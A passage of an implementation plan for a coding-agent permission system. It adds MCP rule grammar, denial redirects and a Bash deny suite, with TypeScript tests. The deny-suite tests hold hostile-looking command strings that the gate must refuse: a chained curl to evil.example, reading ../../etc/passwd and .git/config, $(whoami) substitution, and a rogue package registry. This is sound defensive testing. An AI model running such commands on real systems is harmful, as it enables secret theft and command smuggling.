  - `function expandMcpRuleGrants(patterns: readonly string[], entries: readonly ProviderGrantEntry[]): readonly ToolGrant[]`
  - `ResolvedPermissions.providerScope?: "all" | "rules" | "none"`
  - `ResolvedProviderTools.entries: readonly ProviderGrantEntry[]`
  - `resolveProviderTools(providers, stage, workdir, options?: { admits?: (providerId: string, localName: string) => boolean })`

- [ ] **Step 1: Write the failing tests**

`test/unit/tools/mcp-rules.test.ts`:

```typescript
import { describe, expect, test } from "bun:test";
import { expandMcpRuleGrants, mcpRuleAdmits, partitionMcpRules } from "@/tools";

describe("partitionMcpRules", () => {
  test("Mcp entries leave the grant list and their patterns are returned", () => {
    const { grants, mcpPatterns } = partitionMcpRules([
      { tool: "Read", patterns: ["*"] },
      { tool: "Mcp", patterns: ["context7", "graph:query"] },
      { tool: "Bash", patterns: ["bun test *"] },
    ]);
    expect(grants.map((grant) => grant.tool)).toEqual(["Read", "Bash"]);
    expect(mcpPatterns).toEqual(["context7", "graph:query"]);
  });

  test("several Mcp expressions merge, never overwrite", () => {
    const { mcpPatterns } = partitionMcpRules([
      { tool: "Mcp", patterns: ["a"] },
      { tool: "Mcp", patterns: ["b:one"] },
    ]);
    expect([...mcpPatterns].sort()).toEqual(["a", "b:one"]);
  });

  test("a list with no Mcp entry is returned unchanged", () => {
    const grants = [{ tool: "Read", patterns: ["*"] }];
    expect(partitionMcpRules(grants)).toEqual({ grants, mcpPatterns: [] });
  });
});

describe("mcpRuleAdmits", () => {
  test.each([
    [["context7"], "context7", "query-docs", true],
    [["context7"], "graph", "query-docs", false],
    [["context7:query-docs"], "context7", "query-docs", true],
    [["context7:query-docs"], "context7", "resolve-id", false],
    [["context7:*"], "context7", "anything", true],
    [["*"], "context7", "query-docs", true],
    [[], "context7", "query-docs", false],
  ])("%o admits %s__%s -> %s", (patterns, providerId, localName, expected) => {
    expect(mcpRuleAdmits(patterns, providerId, localName)).toBe(expected);
  });
});

describe("expandMcpRuleGrants", () => {
  test("expands to concrete namespaced grants, never the key \"Mcp\"", () => {
    const grants = expandMcpRuleGrants(["context7:query-docs"], [
      { providerId: "context7", localNames: ["query-docs", "resolve-id"] },
      { providerId: "graph", localNames: ["query"] },
    ]);
    expect(grants).toEqual([{ tool: "context7__query-docs", patterns: ["*"] }]);
    expect(grants.some((grant) => grant.tool === "Mcp")).toBe(false);
  });

  test("a server-level pattern expands to every surviving tool of that server", () => {
    const grants = expandMcpRuleGrants(["context7"], [
      { providerId: "context7", localNames: ["query-docs", "resolve-id"] },
    ]);
    expect(grants.map((grant) => grant.tool)).toEqual(["context7__query-docs", "context7__resolve-id"]);
  });
});
```

`test/unit/config/mcp-expression-validation.test.ts`:

```typescript
import { describe, expect, test } from "bun:test";
import { validatePermissionsBlock } from "@/config/config-guards";

const block = (permissions: Record<string, unknown>) => ({ execution: { permissions } });

describe("Mcp(...) expressions at load", () => {
  test.each([["Mcp(context7)"], ["Mcp(context7:query-docs)"], ["Mcp(context7:*)"], ["Mcp(a,b:one)"]])(
    "%s is accepted",
    (expression) => {
      expect(() => validatePermissionsBlock(block({ run: { allow: [expression] } }))).not.toThrow();
    },
  );

  test("an unknown server is NOT a load error (a config is shared across machines)", () => {
    expect(() => validatePermissionsBlock(block({ run: { allow: ["Mcp(never-configured)"] } }))).not.toThrow();
  });

  // The repo idiom for a thrown NaxError is `toThrow(/regex/i)` on the message
  // (see test/unit/config/scoped-profile-accepted.test.ts:38-66). `assertNaxError`
  // from @test/helpers is something else entirely — it narrows an already-CAUGHT
  // value (`assertNaxError(err, label)`), so do not reach for it here.
  test.each([["Mcp(Context7)"], ["Mcp(has spaces)"], ["Mcp(:no-server)"], ["Mcp(a__b)"]])(
    "%s is a malformed-pattern error",
    (expression) => {
      expect(() => validatePermissionsBlock(block({ run: { allow: [expression] } }))).toThrow(/malformed Mcp pattern/i);
    },
  );

  test("the malformed-pattern refusal carries the CONFIG_PERMISSIONS_BAD_PATTERN code", () => {
    try {
      validatePermissionsBlock(block({ run: { allow: ["Mcp(Context7)"] } }));
      throw new Error("expected validatePermissionsBlock to throw");
    } catch (err) {
      assertNaxError(err, "validatePermissionsBlock rejection");
      expect(err.code).toBe("CONFIG_PERMISSIONS_BAD_PATTERN");
    }
  });

  test("Mcp rules are legal in deny and ask lists too", () => {
    expect(() =>
      validatePermissionsBlock(block({ run: { deny: ["Mcp(graph)"], ask: ["Mcp(graph:mutate)"] } })),
    ).not.toThrow();
  });
});
```

Add `import { assertNaxError } from "@test/helpers";` for the last case only — it is a
caught-value narrower (`assertNaxError(value, label)`, `test/helpers/assert-nax-error.ts`),
never a wrapper around a thrown call.

`test/unit/agents/mcp-under-scoped.test.ts`:

```typescript
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { cleanupTempDir, makeNaxConfig, makeTempDir } from "@test/helpers";
import { resolveCodingToolSupport } from "@/agents/coding-tool-support";
import type { ProviderTool, ToolProvider } from "@/tools";

let root: string;

beforeEach(() => {
  root = makeTempDir("mcp-scoped-");
});

afterEach(() => {
  cleanupTempDir(root);
});

function fakeProvider(id: string, localNames: readonly string[]): ToolProvider {
  const tools: ProviderTool[] = localNames.map((localName) => ({
    localName,
    description: `${localName} description`,
    inputSchema: { type: "object", properties: {} },
    run: async () => ({ content: "ok" }),
  }));
  return { id, kind: "discovered", stages: ["*"], tools: async () => tools };
}

const resolve = (execution: Record<string, unknown>, providers: readonly ToolProvider[]) =>
  resolveCodingToolSupport({
    declaredTools: ["Read"],
    providers,
    codingToolRoot: root,
    pipelineStage: "run",
    config: makeNaxConfig({ execution }),
  });

describe("MCP under a scoped profile (spec R7 / US-006)", () => {
  test("a scoped stage with Mcp(server) gets exactly that server's tools", async () => {
    const support = await resolve(
      {
        permissionProfile: "scoped",
        permissions: { run: { allow: ["Read", "Mcp(context7)"] } },
      },
      [fakeProvider("context7", ["query-docs", "resolve-id"]), fakeProvider("graph", ["query"])],
    );
    const names = support?.tools.map((tool) => tool.name) ?? [];
    expect(names).toContain("context7__query-docs");
    expect(names).toContain("context7__resolve-id");
    expect(names).not.toContain("graph__query");
  });

  test("Mcp(server:tool) narrows to one tool", async () => {
    const support = await resolve(
      { permissionProfile: "scoped", permissions: { run: { allow: ["Read", "Mcp(context7:query-docs)"] } } },
      [fakeProvider("context7", ["query-docs", "resolve-id"])],
    );
    const names = support?.tools.map((tool) => tool.name) ?? [];
    expect(names).toEqual(expect.arrayContaining(["context7__query-docs"]));
    expect(names).not.toContain("context7__resolve-id");
  });

  test("a scoped stage with NO Mcp rule gets no provider tools", async () => {
    const support = await resolve({ permissionProfile: "scoped", permissions: { run: { allow: ["Read"] } } }, [
      fakeProvider("context7", ["query-docs"]),
    ]);
    expect(support?.tools.map((tool) => tool.name) ?? []).not.toContain("context7__query-docs");
  });

  test("row 10: `safe` advertises no provider tools even with an Mcp rule", async () => {
    const support = await resolve({ permissionProfile: "safe", permissions: { run: { allow: ["Mcp(context7)"] } } }, [
      fakeProvider("context7", ["query-docs"]),
    ]);
    expect(support?.tools.map((tool) => tool.name) ?? []).not.toContain("context7__query-docs");
  });

  test("unrestricted still gets every attached provider (unchanged)", async () => {
    const support = await resolve({ permissionProfile: "unrestricted" }, [fakeProvider("context7", ["query-docs"])]);
    expect(support?.tools.map((tool) => tool.name) ?? []).toContain("context7__query-docs");
  });

  test("a deny rule binds under unrestricted too (spec R10)", async () => {
    const support = await resolve(
      { permissionProfile: "unrestricted", permissions: { run: { deny: ["Mcp(context7:query-docs)"] } } },
      [fakeProvider("context7", ["query-docs", "resolve-id"])],
    );
    const outcome = await support?.runtime.callTool("context7__query-docs", {});
    expect(outcome?.kind).toBe("denied");
  });

  test('"Mcp" never reaches the compiled policy as a tool name', async () => {
    const support = await resolve(
      { permissionProfile: "scoped", permissions: { run: { allow: ["Read", "Mcp(context7)"] } } },
      [fakeProvider("context7", ["query-docs"])],
    );
    const outcome = await support?.runtime.callTool("Mcp", {});
    expect(outcome?.kind).toBe("denied");
  });
});
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `bun test test/unit/tools/mcp-rules.test.ts test/unit/config/mcp-expression-validation.test.ts test/unit/agents/mcp-under-scoped.test.ts`
Expected: FAIL — `Mcp` is an unknown tool at load; the helpers do not exist; scoped resolves no providers.

- [ ] **Step 3: Add the rule helpers**

Append to `src/tools/provider-grants.ts`:

```typescript
/**
 * The pseudo-tool name `Mcp(...)` parses to. SURFACE SYNTAX ONLY: it must be
 * partitioned out and expanded before compilation (see this file's header).
 */
export const MCP_RULE_TOOL = "Mcp";

/**
 * Split `Mcp(...)` rules out of a parsed rule list.
 *
 * Patterns MERGE across entries rather than overwriting, unlike the allow
 * compiler's per-tool last-write-wins: two `Mcp(...)` expressions in one list
 * are two servers a human named, and dropping the earlier one would silently
 * withdraw a grant that is written in the config.
 */
export function partitionMcpRules(grants: readonly ToolGrant[]): {
  readonly grants: readonly ToolGrant[];
  readonly mcpPatterns: readonly string[];
} {
  const kept: ToolGrant[] = [];
  const mcpPatterns: string[] = [];
  for (const grant of grants) {
    if (grant.tool === MCP_RULE_TOOL) mcpPatterns.push(...grant.patterns);
    else kept.push(grant);
  }
  return { grants: kept, mcpPatterns };
}

/** Does an `Mcp` pattern list admit `<providerId>__<localName>`?
 * `*` = every server; `server` = every tool of that server; `server:tool` =
 * one tool; `server:*` = every tool of that server, written explicitly. */
export function mcpRuleAdmits(patterns: readonly string[], providerId: string, localName: string): boolean {
  return patterns.some((pattern) => {
    if (pattern === "*") return true;
    const colon = pattern.indexOf(":");
    if (colon === -1) return pattern === providerId;
    return pattern.slice(0, colon) === providerId && ["*", localName].includes(pattern.slice(colon + 1));
  });
}

/**
 * Expand `Mcp` patterns against the tools a provider actually advertised.
 *
 * Keyed on the post-lock, post-`allowedTools` list the caller passes in, so a
 * rule can only ever narrow what the provider layer already admitted — and the
 * result is concrete `<id>__<tool>` grants, which is the only shape
 * `compileToolPolicy` can key on.
 */
export function expandMcpRuleGrants(
  patterns: readonly string[],
  entries: readonly ProviderGrantEntry[],
): readonly ToolGrant[] {
  const admitted: ProviderGrantEntry[] = entries.map((entry) => ({
    providerId: entry.providerId,
    localNames: entry.localNames.filter((localName) => mcpRuleAdmits(patterns, entry.providerId, localName)),
  }));
  return expandProviderGrants(admitted.filter((entry) => entry.localNames.length > 0));
}
```

`src/tools/provider-grants.ts` currently imports only `namespacedToolName` and `ToolGrant`; `expandProviderGrants` is defined in the same file, so no new import is needed. `src/tools/index.ts` re-exports this module with `export * from "./provider-grants"`, so the new names are on the barrel automatically.

- [ ] **Step 4: Expose `(providerId, localName)` pairs and an admit predicate**

In `src/tools/provider-advertise.ts`, add to `ResolvedProviderTools`:

```typescript
  /**
   * (providerId, localNames) pairs for the tools that survived sanitisation,
   * the lock and `allowedTools`. Exposed because `Mcp(server:tool)` rules must
   * be matched against the LOCAL name, and `<id>__<local>` is never parsed
   * back apart (src/tools/provider-adapt.ts's header).
   */
  readonly entries: readonly ProviderGrantEntry[];
```

Import `type ProviderGrantEntry` from `./provider-grants`, add the options parameter, and apply the predicate where each tool is adapted:

```typescript
export async function resolveProviderTools(
  providers: readonly ToolProvider[],
  stage: PipelineStage,
  workdir: string,
  options?: {
    /**
     * Narrows which discovered tools are advertised at all. Applied HERE, not
     * after the fact: a tool a scoped stage did not admit must never be
     * adapted, advertised or granted (spec US-006).
     */
    readonly admits?: (providerId: string, localName: string) => boolean;
  },
): Promise<ResolvedProviderTools> {
```

```typescript
      for (const tool of sanitized) {
        if (options?.admits !== undefined && !options.admits(provider.id, tool.localName)) continue;
        const adapted = adaptProviderTool(provider.id, tool);
        tools.push(adapted);
        providerIdByTool.set(adapted.name, provider.id);
        localNames.push(tool.localName);
      }
```

```typescript
  return { tools, grants: expandProviderGrants(entries), failures, providerIdByTool, entries };
```

- [ ] **Step 5: Decide the provider scope in the SSOT**

In `src/config/permissions.ts`, add to `ResolvedPermissions`:

```typescript
  /**
   * How far provider (MCP) tools reach for this stage (spec R7).
   *
   * `all` — every attached provider, as `unrestricted` has always had it.
   * `rules` — only what the stage's `Mcp(...)` rules admit (`scoped`).
   * `none` — no provider tools at all (`safe`, and the fail-closed arm).
   *
   * Decided here rather than by the consumer because `scoped` and `safe` both
   * resolve to the same MODE, so no consumer can tell them apart — and this is
   * a permission decision, which lives in this file by rule.
   */
  providerScope?: "all" | "rules" | "none";
```

Set it in each arm: `unrestricted` → `providerScope: "all"`, `safe` → `"none"`, `resolveScopedPermissions`'s base → `"rules"`. Leave the invalid-profile arm as it is (absent, read as `none`) — that arm grants nothing at all.

- [ ] **Step 6: Consume it, and expand the rules, in the dispatch seam**

In `src/agents/coding-tool-support.ts`, replace the `providersPermitted` gate (line 282 on `3accdbd6f`) and the `providerResult` call that follows (:283):

```typescript
  // Mcp(...) is surface syntax: partition it out BEFORE anything compiles a
  // policy. A surviving {tool:"Mcp"} grant keys the compiled map on "Mcp",
  // matches no advertised name and denies every call while every parser test
  // stays green (provider-tools R3).
  const allow = partitionMcpRules(resolved.toolGrants ?? []);
  const denied = partitionMcpRules(resolved.denyRules ?? []);
  const asked = partitionMcpRules(resolved.askRules ?? []);

  // The root test is written inline rather than hoisted to a `hasRoot` boolean
  // so TypeScript narrows `root` inside the branch — a hoisted flag would force
  // an `as string` cast on a value the condition already proved.
  const providerScope = resolved.providerScope ?? "none";
  const providerResult: ResolvedProviderTools =
    providerScope !== "none" && root !== undefined && root.trim() !== ""
    ? await resolveProviderTools(options.providers ?? [], options.pipelineStage ?? "run", root, {
        // "all" keeps today's behaviour; "rules" admits only what the stage's
        // Mcp rules name, evaluated before a tool is ever adapted.
        ...(providerScope === "rules"
          ? { admits: (providerId: string, localName: string) => mcpRuleAdmits(allow.mcpPatterns, providerId, localName) }
          : {}),
      })
    : {
        tools: [],
        grants: [],
        failures: [] as readonly { providerId: string; reason: string }[],
        providerIdByTool: new Map<string, string>(),
        entries: [],
      };
```

then, above the `return buildCodingToolSupport({...})` call, expand the deny/ask Mcp rules:

```typescript
  // Deny and ask bind under EVERY profile (spec R10), so Mcp deny/ask rules are
  // expanded even when providerScope is "all" — a deny must be able to withdraw
  // one tool from an otherwise fully-granted provider.
  const denyRules = [...denied.grants, ...expandMcpRuleGrants(denied.mcpPatterns, providerResult.entries)];
  const askRules = [...asked.grants, ...expandMcpRuleGrants(asked.mcpPatterns, providerResult.entries)];
```

and feed the partitioned lists into it, REPLACING the three existing lines that read
`grants:`, `...(resolved.denyRules !== undefined ...)` and `...(resolved.askRules !== undefined ...)`:

```typescript
    grants: [...allow.grants, ...providerResult.grants],
    ...(denyRules.length > 0 ? { denyRules } : {}),
    ...(askRules.length > 0 ? { askRules } : {}),
```

Keep the existing `nax-permission-mode-allow` comment on whichever line still reads a mode literal; if no literal remains in this file, remove the now-false comment and re-run `bun run check:permission-mode-ssot`.

**Then fix the comment this task falsifies.** The R12 block above the old gate (`src/agents/coding-tool-support.ts`, the paragraph beginning "Provider tools bypass the DECLARATION half of advertisement") states that *"only the `unrestricted` profile (approve-all) grants provider tools"* and that *"under `safe` and `scoped` a provider contributes no tools, no grants and no map entry."* Half of that is now false. Rewrite that half to read: `scoped` admits exactly what the stage's `Mcp(...)` rules name — evaluated before a tool is adapted, so an unadmitted tool still contributes no tool, grant or map entry — while `safe` continues to contribute nothing at all. A stale comment here is worse than no comment: it is the sentence a future reader will trust over the code.

- [ ] **Step 7: Validate `Mcp(...)` at load**

In `src/config/config-guards.ts`, extend the known set and add pattern validation:

```typescript
  // `Mcp` is a PSEUDO-tool: it is expanded to concrete `<server>__<tool>`
  // grants before compilation (src/tools/provider-grants.ts), so it is legal
  // in a rule list even though no tool by that name is ever registered.
  const known = new Set<string>([...RESERVED_TOOL_NAMES, MCP_RULE_TOOL]);
```

and inside `validateToolExpression`, after the known-name check:

```typescript
  if (tool === MCP_RULE_TOOL && open !== -1) {
    const inner = expression.slice(open + 1, expression.lastIndexOf(")"));
    for (const pattern of inner.split(",").map((entry) => entry.trim())) {
      if (pattern === "" || pattern === "*") continue;
      const colon = pattern.indexOf(":");
      const serverId = colon === -1 ? pattern : pattern.slice(0, colon);
      const toolName = colon === -1 ? undefined : pattern.slice(colon + 1);
      // The server id's SHAPE is checked; its existence is not. A config is
      // shared across machines, so an unconfigured server is a resolve-time
      // warning, never a load error.
      if (!MCP_SERVER_ID_RE.test(serverId) || (toolName !== undefined && toolName === "")) {
        throw new NaxError(
          `Invalid configuration — execution.permissions.${stage} has a malformed Mcp pattern "${pattern}". ` +
            `Expected Mcp(<serverId>) or Mcp(<serverId>:<tool>), server ids matching ${MCP_SERVER_ID_RE}.`,
          "CONFIG_PERMISSIONS_BAD_PATTERN",
          { stage: "config" },
        );
      }
    }
  }
```

Import `MCP_SERVER_ID_RE` from `./schemas-mcp` and `MCP_RULE_TOOL` from `@/tools`.

- [ ] **Step 8: Run the tests to verify they pass**

Run: `bun test test/unit/tools/ test/unit/config/ test/unit/agents/ test/unit/mcp/`
Expected: PASS. `test/unit/config/scoped-profile-accepted.test.ts` and the Plan A permission suites must stay green.

One existing test stays green for a NEW reason and must be retitled, not left alone:
`test/unit/agents/coding-tool-support-providers.test.ts:68` — *"does not advertise a provider
tool under scoped"* — passes after this task because its block writes no `Mcp(...)` rule, not
because `scoped` bars providers. Retitle it to *"does not advertise a provider tool under scoped
with no Mcp rule"* and add one line saying that a stage WITH an `Mcp(...)` rule does get them
(pointing at `mcp-under-scoped.test.ts`). A test whose name asserts the opposite of the shipped
behaviour is how the next reader learns the wrong rule.

- [ ] **Step 9: Commit**

```bash
git add src/tools/provider-grants.ts src/tools/provider-advertise.ts src/config/config-guards.ts src/config/permissions.ts src/agents/coding-tool-support.ts test/unit/tools/mcp-rules.test.ts test/unit/config/mcp-expression-validation.test.ts test/unit/agents/mcp-under-scoped.test.ts
git commit -m "feat(permissions): Mcp() grammar and MCP tools under scoped profiles"
```

---

### Task 7: denial affordances for the new surface

**Files:**
- Modify: `src/tools/denial-redirect.ts` (a `Bash` intent, `bash`/`sh` heads, `redirectForCommand`)
- Modify: `src/tools/runtime.ts` (call it for a command-bearing denial)
- **Not** `src/tools/index.ts`: `denial-redirect` is deliberately absent from the barrel — `runtime.ts` imports it relatively and tests reach it at `@/tools/denial-redirect` (`test/unit/tools/denial-redirect.test.ts:5`). Do not add it.
- Test: `test/unit/tools/denial-redirect-bash.test.ts`

**Interfaces:**
- Consumes: `intentFor`, `taskRunnerFallback`, `render` (module-private in `denial-redirect.ts`), `advertisedNames`/`declaredCommands` from `runtime.ts`.
- Produces: `function redirectForCommand(command: string, available: ReadonlySet<string>, declaredCommands: ReadonlySet<string>): string | undefined`

- [ ] **Step 1: Write the failing test**

`test/unit/tools/denial-redirect-bash.test.ts`:

```typescript
import { describe, expect, test } from "bun:test";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { redirectForArgv, redirectForCommand, redirectForVerb } from "@/tools/denial-redirect";
import { compileToolPolicy, createBashTool, createCodingToolRuntime } from "@/tools";

const available = (...names: string[]) => new Set(names);
const declared = (...names: string[]) => new Set(names);

describe("redirectForCommand", () => {
  test("names Grep for a denied grep command", () => {
    expect(redirectForCommand("grep -n foo src", available("Grep"), declared())).toContain("`Grep`");
  });

  test("reads the FIRST segment of a chain", () => {
    expect(redirectForCommand("git log --oneline | head -5", available("Git"), declared())).toContain("`Git`");
  });

  test("names the project's declared commands for a task runner", () => {
    expect(redirectForCommand("bun run lint", available("RunCommand"), declared("lint"))).toContain("lint");
  });

  test("never names a tool the session does not have", () => {
    expect(redirectForCommand("grep -n foo src", available(), declared())).toBeUndefined();
  });

  test("a command with an unanalysable construct still gets a redirect", () => {
    expect(redirectForCommand("grep $(cat pattern.txt) src", available("Grep"), declared())).toContain("`Grep`");
  });

  test("nax's own run state is explained rather than redirected", () => {
    const hint = redirectForCommand("git checkout .nax/state.json", available("Git"), declared());
    expect(hint).toContain(".nax/");
  });
});

describe("Bash as a redirect target (spec US-008)", () => {
  test("a denied `bash -c ...` argv names Bash when the session has it", () => {
    expect(redirectForArgv(["bash", "-c", "bun test"], available("Bash"), declared())).toContain("`Bash`");
  });

  test("and does NOT name it when the session does not", () => {
    expect(redirectForArgv(["bash", "-c", "bun test"], available("Read"), declared())).toBeUndefined();
  });

  test("a denied `sh` verb slot names Bash when advertised", () => {
    expect(redirectForVerb("RunCommand", "sh -c 'bun test'", available("Bash"), declared())).toContain("`Bash`");
  });

  test("telling Bash it already has Bash is suppressed", () => {
    expect(redirectForVerb("Bash", "bash -c 'bun test'", available("Bash"), declared())).toBeUndefined();
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test test/unit/tools/denial-redirect-bash.test.ts`
Expected: FAIL — `redirectForCommand` does not exist and no row answers `bash`/`sh`.

- [ ] **Step 3: Write the implementation**

In `src/tools/denial-redirect.ts`, add the intent beside the others:

```typescript
const BASH: Intent = {
  tool: "Bash",
  how: "Bash runs one shell command string, when a Bash(...) allow rule covers every segment of it",
};
```

add the shell heads to `HEAD_INTENTS` (`bash`, `sh`, `zsh` — the rows that used to dead-end):

```typescript
  ["bash", BASH],
  ["sh", BASH],
  ["zsh", BASH],
```

and add the command entry point beside `redirectForArgv`:

```typescript
/**
 * Name the tool that serves the intent behind a denied Bash COMMAND.
 *
 * Reads the first segment only: that is what the model reached for, and a
 * later segment's intent is not what to teach when the call is refused. The
 * split is deliberately its own crude one rather than the lexer's
 * (`lexBashCommand`): a command REFUSED for an unanalysable construct must
 * still get a redirect, and the lexer returns nothing to read in that case.
 */
export function redirectForCommand(
  command: string,
  available: ReadonlySet<string>,
  declaredCommands: ReadonlySet<string>,
): string | undefined {
  const [first = ""] = command.split(/&&|\|\||;|\||\n/);
  const tokens = first
    .trim()
    .split(/\s+/)
    .filter((token) => token.length > 0);
  if (tokens.length === 0) return undefined;

  const ownedRunState = naxOwnedRunStateExplanation(tokens);
  if (ownedRunState !== undefined) return ownedRunState;

  const hit = intentFor(tokens);
  if (hit === undefined) return taskRunnerFallback(tokens, available, declaredCommands);
  // Telling Bash it already has Bash reads as a contradiction of the denial —
  // the same suppression redirectForVerb applies.
  if (hit.tool === "Bash") return undefined;
  return render(hit, available, declaredCommands);
}
```

`redirectForVerb` already suppresses `hit.tool === deniedTool`, so the `Bash`-denies-`bash` case is covered there once the head rows exist.

In `src/tools/runtime.ts`, inside the `if (!verdict.allowed)` block, read the command field and prefer it:

```typescript
        const commandField = tool.scope.commandField;
        const rawCommand = commandField === undefined ? undefined : input[commandField];
```

```typescript
        const extra =
          typeof rawCommand === "string"
            ? redirectForCommand(rawCommand, advertisedNames, declared)
            : Array.isArray(rawArgv)
              ? redirectForArgv(rawArgv as readonly string[], advertisedNames, declared)
              : typeof rawVerb === "string"
                ? redirectForVerb(name, rawVerb, advertisedNames, declared)
                : undefined;
```

and import `redirectForCommand` alongside the other two.

- [ ] **Step 4: Pin the `denied:ask` message (no code change — spec US-008)**

Append to `test/unit/tools/denial-redirect-bash.test.ts` — the imports it needs are already in the block above:

```typescript
describe("the denied:ask message (spec US-007/US-008)", () => {
  test("names the rule and the headless limitation, not a prohibition", async () => {
    const root = makeTempDir("ask-message-");
    try {
      const runtime = createCodingToolRuntime({
        policy: compileToolPolicy([{ tool: "Bash", patterns: ["rm *"] }], root, {
          askRules: [{ tool: "Bash", patterns: ["rm *"] }],
        }),
        extraTools: [createBashTool()],
      });
      runtime.advertised(["Bash"]);
      const outcome = await runtime.callTool("Bash", { command: "rm src/a.ts" });
      expect(outcome.kind).toBe("denied");
      if (outcome.kind === "denied") {
        expect(outcome.reason).toContain("Bash(rm *)");
        expect(outcome.reason).toContain("headless");
      }
    } finally {
      cleanupTempDir(root);
    }
  });
});
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `bun test test/unit/tools/denial-redirect-bash.test.ts test/unit/tools/denial-redirect.test.ts test/unit/tools/runtime.test.ts`
Expected: PASS. `denial-redirect.test.ts` is the large existing suite and stays green because
neither of its fixtures (`ALL` at :10, `AVAILABLE` at :62) contains `Bash`, so `render()` still
withholds the new rows. If a case there DOES start returning a `Bash` hint, a fixture gained the
name — investigate rather than loosening the assertion.

One comment there is now false and must be corrected: at `test/unit/tools/denial-redirect.test.ts`
in *"still says nothing for a shape no tool serves"*, the comment reads *"bash/mv/git restore stay
unanswered on purpose"*. After this task `bash` IS answered — when, and only when, the session
actually holds `Bash`. Narrow that comment to `mv` and `git restore`, and say that the `bash` row
returns undefined here because this fixture holds no `Bash`.

- [ ] **Step 6: Commit**

```bash
git add src/tools/denial-redirect.ts src/tools/runtime.ts src/tools/index.ts test/unit/tools/denial-redirect-bash.test.ts
git commit -m "feat(tools): Bash-aware denial redirects"
```

---

### Task 8: the deny suite, the ADR amendment, the Permissions page, and the gates

**Files:**
- Create: `test/integration/permissions/bash-deny-suite.test.ts`
- Create: `docs/guides/permissions.md`
- Modify: `docs/README.md` (guide table row)
- Modify: `docs/adr/ADR-029-phase-c-native-coding-agent-scope.md` (dated amendment under §3)

**Interfaces:**
- Consumes: everything Tasks 1–7 produced, through `buildCodingToolSupport` and `runtime.callTool` — the same path dispatch uses.
- Produces: the acceptance spine (spec R9). This is the task that makes the feature's own refusals a tested deliverable.

- [ ] **Step 1: Write the deny suite**

`test/integration/permissions/bash-deny-suite.test.ts`:

```typescript
/**
 * The deny suite (spec §6) — the acceptance spine of the Bash feature.
 *
 * ADR-029 §3's standing bar: "whatever gate is designed must be able to say
 * no, and must be tested on its ability to say no." Every row below is a call
 * that MUST be refused, exercised through the same seam dispatch uses
 * (buildCodingToolSupport -> runtime.callTool), not through the policy alone.
 * A green build in which these do not run is a failed build of this feature.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { buildCodingToolSupport } from "@/agents/coding-tool-support";

/**
 * A fix-shaped session. Read/Glob/Grep are declared AND granted deliberately:
 * row 1 asserts that an ungranted Bash call is redirected to a structured
 * tool, and `denial-redirect.ts` never names a tool the session does not hold
 * — so a fixture that declares only Read cannot prove the redirect at all.
 */
const FIX_TOOLS = ["Read", "Glob", "Grep", "Bash"] as const;
const STRUCTURED_GRANTS = [
  { tool: "Read", patterns: ["*"] },
  { tool: "Glob", patterns: ["*"] },
  { tool: "Grep", patterns: ["*"] },
] as const;

let root: string;

beforeEach(() => {
  root = makeTempDir("bash-deny-suite-");
  writeFileSync(join(root, "file.txt"), "x");
  mkdirSync(join(root, ".git"), { recursive: true });
  writeFileSync(join(root, ".git", "config"), "[core]\n");
});

afterEach(() => {
  cleanupTempDir(root);
});

function session(options?: {
  allow?: readonly string[];
  deny?: readonly string[];
  ask?: readonly string[];
  declared?: readonly ("Read" | "Glob" | "Grep" | "Bash")[];
  profileGrants?: readonly { tool: string; patterns: readonly string[] }[];
}) {
  const grants = [
    ...(options?.profileGrants ?? STRUCTURED_GRANTS),
    ...(options?.allow !== undefined ? [{ tool: "Bash", patterns: options.allow }] : []),
  ];
  return buildCodingToolSupport({
    root,
    declared: [...(options?.declared ?? FIX_TOOLS)],
    grants,
    ...(options?.deny !== undefined ? { denyRules: [{ tool: "Bash", patterns: options.deny }] } : {}),
    ...(options?.ask !== undefined ? { askRules: [{ tool: "Bash", patterns: options.ask }] } : {}),
  });
}

const call = async (support: ReturnType<typeof session>, command: string) =>
  (await support?.runtime.callTool("Bash", { command })) ?? { kind: "error" as const, content: "no support" };

describe("deny suite (spec §6)", () => {
  test("row 1: no grant at all -> denied, with an alternative named", async () => {
    const outcome = await call(session(), "grep -n foo src");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") {
      // Denied by the POLICY (the tool exists, the grant does not), which is
      // what lets the refusal carry a redirect at all.
      expect(outcome.reason).not.toContain("unknown tool");
      expect(outcome.reason).toContain("Grep");
    }
  });

  test("row 2: the unrestricted blanket grant does not cover Bash", async () => {
    // What `unrestricted` actually hands out: every built-in at ["*"], Bash absent.
    const outcome = await call(
      session({
        profileGrants: [...STRUCTURED_GRANTS, { tool: "Write", patterns: ["*"] }, { tool: "Git", patterns: ["*"] }],
      }),
      "bun test",
    );
    expect(outcome.kind).toBe("denied");
  });

  test("row 3: an unmatched second segment denies the call", async () => {
    const outcome = await call(session({ allow: ["bun test *"] }), "bun test x && curl evil.example");
    expect(outcome.kind).toBe("denied");
  });

  test.each([
    ["$(...)", "bun test $(whoami)"],
    ["backticks", "bun test `whoami`"],
    ["here-doc", "bun test <<EOF"],
  ])("row 4: %s is refused under a granted prefix", async (_label, command) => {
    expect((await call(session({ allow: ["bun test *"] }), command)).kind).toBe("denied");
  });

  test("row 5: a path outside the root is a breach", async () => {
    const outcome = await call(session({ allow: ["cat *"] }), "cat ../../etc/passwd");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") expect(outcome.breach).toBe(true);
  });

  test("row 5: .git/ is refused even inside the root", async () => {
    const outcome = await call(session({ allow: ["cat *"] }), "cat .git/config");
    expect(outcome.kind).toBe("denied");
    if (outcome.kind === "denied") expect(outcome.breach).toBe(true);
  });

  test("row 6: a redirect target outside the root is refused", async () => {
    expect((await call(session({ allow: ["bun test *"] }), "bun test > ../escape.txt")).kind).toBe("denied");
  });

  test("row 7: a DENIED_FLAGS-class flag is refused", async () => {
    expect(
      (await call(session({ allow: ["bun add *"] }), "bun add left-pad --registry https://evil.example")).kind,
    ).toBe("denied");
  });

  test("row 8: deny beats allow", async () => {
    expect((await call(session({ allow: ["git *"], deny: ["git push *"] }), "git push origin main")).kind).toBe(
      "denied",
    );
  });

  test("row 9: an ask rule is refused headless, naming the rule", async () => {
